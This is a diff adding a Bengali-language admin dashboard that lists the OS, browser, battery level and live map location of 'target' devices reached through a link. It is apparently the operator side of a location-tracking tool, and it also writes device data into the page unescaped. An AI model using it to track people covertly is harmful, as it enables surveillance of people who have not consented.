@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>অ্যাডমিন ড্যাশবোর্ড</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0f172a; color: #e2e8f0; padding: 20px; }
+        h1 { text-align: center; margin-bottom: 20px; color: #38bdf8; }
+        .dashboard { display: flex; flex-wrap: wrap; gap: 20px; }
+        .map-container { flex: 2; min-width: 300px; height: 500px; background: #1e293b; border-radius: 15px; overflow: hidden; }
+        #map { height: 100%; width: 100%; }
+        .info-panel { flex: 1; min-width: 250px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
+        .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
+        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #38bdf8; }
+        .device-card .name { font-weight: bold; font-size: 16px; }
+        .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 4px; }
+        .online { border-left-color: #22c55e; }
+        .no-data { text-align: center; color: #64748b; margin-top: 50px; }
+    </style>
+</head>
+<body>
+    <h1>📡 লাইভ মনিটরিং ড্যাশবোর্ড</h1>
+    <div class="dashboard">
+        <div class="map-container">
+            <div id="map"></div>
+        </div>
+        <div class="info-panel">
+            <h2>📱 কানেক্টেড ডিভাইস</h2>
+            <div id="deviceList">
+                <div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।<br>টার্গেট লিংকটি খুলে সম্মতি দিন।</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        // Socket.IO কানেকশন
+        const socket = io();
+        
+        let map = L.map('map').setView([23.8103, 90.4125], 12);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap'
+        }).addTo(map);
+        
+        let markers = {};
+
+        socket.on('update-clients', (clients) => {
+            const list = document.getElementById('deviceList');
+            list.innerHTML = '';
+            const clientIds = Object.keys(clients);
+
+            if (clientIds.length === 0) {
+                list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
+                Object.keys(markers).forEach(id => {
+                    map.removeLayer(markers[id]);
+                    delete markers[id];
+                });
+                return;
+            }
+
+            clientIds.forEach(id => {
+                const data = clients[id];
+                const card = document.createElement('div');
+                card.className = 'device-card online';
+                card.innerHTML = `
+                    <div class="name">🖥️ ${data.os || 'অজানা ডিভাইস'}</div>
+                    <div class="detail">🔋 ব্যাটারি: ${data.battery || 'N/A'}%</div>
+                    <div class="detail">🌐 ব্রাউজার: ${data.browser || 'N/A'}</div>
+                    <div class="detail">📍 অবস্থান: ${data.lat ? data.lat.toFixed(4) : 'পাওয়া যায়নি'}, ${data.lng ? data.lng.toFixed(4) : ''}</div>
+                    <div class="detail" style="font-size:11px; color:#64748b;">🕒 শেষ আপডেট: ${new Date(data.lastSeen).toLocaleTimeString()}</div>
+                `;
+                list.appendChild(card);
+
+                if (data.lat && data.lng) {
+                    const pos = [data.lat, data.lng];
+                    if (markers[id]) {
+                        markers[id].setLatLng(pos);
+                    } else {
+                        const marker = L.marker(pos).addTo(map);
+                        marker.bindPopup(`<b>${data.os}</b><br>ব্যাটারি: ${data.battery}%`);
+                        markers[id] = marker;
+                    }
+                    map.setView(pos, 14);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
